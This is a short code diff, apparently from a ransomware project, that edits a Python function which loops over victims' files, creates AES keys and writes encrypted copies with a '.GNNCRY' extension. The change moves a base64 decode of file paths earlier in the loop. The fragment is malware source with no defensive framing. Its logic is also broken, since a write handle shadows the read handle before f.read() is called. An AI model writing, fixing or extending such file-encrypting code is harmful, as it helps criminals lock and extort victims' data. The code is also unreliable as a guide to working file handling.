@@ -49,13 +49,12 @@ def start_encryption(files):
     AES_and_base64_path = []
     for found_file in files:
         try:
+            found_file = base64.b64decode(found_file)
             with open(found_file, 'rb') as f:
                 new_file_name = found_file.decode('utf-8') + ".GNNCRY"
                 with open(new_file_name, 'wb') as f:
                     key = generate_keys.generate_key(128, True)
                     AES_obj = symmetric.AESCipher(key)
-
-                    found_file = base64.b64decode(found_file)
 
                     file_content = f.read()
 
